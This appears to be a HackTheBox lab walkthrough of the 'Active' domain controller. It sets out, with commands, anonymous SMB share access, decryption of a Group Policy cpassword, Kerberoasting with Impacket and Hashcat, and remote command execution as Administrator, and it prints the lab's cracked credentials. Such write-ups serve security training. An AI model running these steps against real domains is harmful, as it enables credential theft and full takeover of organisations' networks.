# Active — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Easy
**OS:** Windows

---

## TL;DR

Anonymous SMB access allows reading the `Replication` share → Inside, we find a `Groups.xml` file containing an encrypted `cpassword` for the `SVC_TGS` Active Directory account → We decrypt the password using `gpp-decrypt` (`SVC_TGS:GPPstillStandingStrong2k18`) → After handling a Kerberos clock-skew issue, we use Impacket's `GetUserSPNs.py` to perform a Kerberoasting attack against the domain using the `SVC_TGS` credentials → We extract the Service Principal Name (SPN) ticket for the `Administrator` account → Cracking the ticket offline yields the Administrator password (`Ticketmaster1968`), granting full control of the Domain Controller.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -p- -n -Pn -sV --min-rate=9362 10.10.10.100
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Microsoft DNS 6.1.7601 |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 | RPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 389 | LDAP | Microsoft Windows AD LDAP (Domain: active.htb) |
| 445 | SMB | microsoft-ds |
| 464 | kpasswd | kpasswd5 |
| 593 | RPC over HTTP| Microsoft Windows RPC over HTTP 1.0 |
| 636 | LDAPSSL | tcpwrapped |
| 3268 | Global Cat.| Microsoft Windows AD LDAP |
| 3269 | Global Cat.| tcpwrapped |
| 5722 | RPC | Microsoft Windows RPC |
| 9389 | mc-nmf | .NET Message Framing |

The target is a Windows Domain Controller for the domain `active.htb`. We add `active.htb` to our `/etc/hosts` file. 

We begin enumerating the SMB service (port 445) using an anonymous login / null session with `crackmapexec`:

```bash
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

The output reveals several default Administrative shares, but notably, the `Replication` share is configured to allow `READ` access to anonymous users.

---

## Exploitation — Group Policy Preferences (GPP) Passwords

We connect to the open `Replication` share using `smbclient` to explore its contents:

```bash
smbclient //10.10.10.100/Replication -N
smb: \> recurse
smb: \> ls
```

Navigating through the Active Directory Group Policy folders (typically located within SYSVOL or Replication shares), we discover a `Groups.xml` file. 

We download and inspect `Groups.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
    </User>
</Groups>
```

The file contains configuration parameters for a local user/group policy. Crucially, it includes an encrypted `cpassword` attribute for the Active Directory user `active.htb\SVC_TGS`.

Prior to 2014, Windows Group Policy Preferences (GPP) allowed administrators to embed passwords in policy files. They were encrypted using AES-256, but Microsoft infamously published the static private encryption key on MSDN, effectively making the encryption completely reversible by anyone.

We use the popular Linux utility `gpp-decrypt` to instantly reverse the AES encryption using the known Microsoft static key:

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

The tool successfully decrypts the string into plaintext: `GPPstillStandingStrong2k18`.

We now have valid domain credentials: `SVC_TGS : GPPstillStandingStrong2k18`.

---

## Privilege Escalation — Kerberoasting 

With valid Active Directory user credentials, our primary escalation path is to check if any user accounts in the domain have a Service Principal Name (SPN) associated with them. Accounts with SPNs are vulnerable to Kerberoasting—an attack where any authenticated user can request a Kerberos service ticket (TGS) for an SPN and attempt to crack it offline.

The username we just compromised (`SVC_TGS`) is a massive hint that Ticket Granting Services are the intended path.

We use Impacket's `GetUserSPNs.py` to request Service Principal Names:

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```

**Troubleshooting Clock Skew:**
Initially, the script might fail with `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`. Kerberos authentication heavily relies on synchronized timestamps; if our attacking machine's clock differs from the Domain Controller by more than 5 minutes, authentication fails.

To fix this, we force an NTP update against the target:
```bash
sudo timedatectl set-ntp off
sudo rdate -n 10.10.10.100
```

With the clock synchronized, we re-run `GetUserSPNs`:
```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```

The script successfully identifies an SPN for the `Administrator` account (`active/CIFS:445`) and retrieves its Kerberos TGS ticket (Hashcat format `$krb5tgs$23`).

We save the output ticket hash to a file (`admin.hash`) and crack it using Hashcat against the RockYou wordlist:

```bash
hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt --force
```

The ticket cracks relatively quickly, revealing the domain administrator password:
`Administrator : Ticketmaster1968`

With Domain Admin credentials in hand, we can authenticate directly to the machine. We can use `psexec`, Evil-WinRM, or (as demonstrated in the raw notes) use `crackmapexec` to automatically execute a PowerShell reverse shell payload:

```bash
crackmapexec smb 10.10.10.100 -u 'administrator' -p 'Ticketmaster1968' -x "whoami"
```

We are `active.htb\Administrator`. **Root.** 🎉

---

## Key Takeaways

- **GPP cpasswords:** An incredibly well-known misconfiguration. Microsoft released a patch (MS14-025) preventing new passwords from being created this way, but legacy generic environments often retain old `Groups.xml` or `Services.xml` files in their SYSVOL directories indefinitely. Attackers only need basic read access to extract them.
- **Kerberos Clock Skew:** Always remember that Kerberos requests will silently fail or throw obscure errors if the attacker and target have a clock drift greater than 5 minutes.
- **Service Accounts as Domain Admins:** Running services (like CIFS) under highly privileged accounts (e.g., Domain Admin) rather than dedicated, low-privileged Managed Service Accounts (gMSAs) exposes the entire domain to Kerberoasting.

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*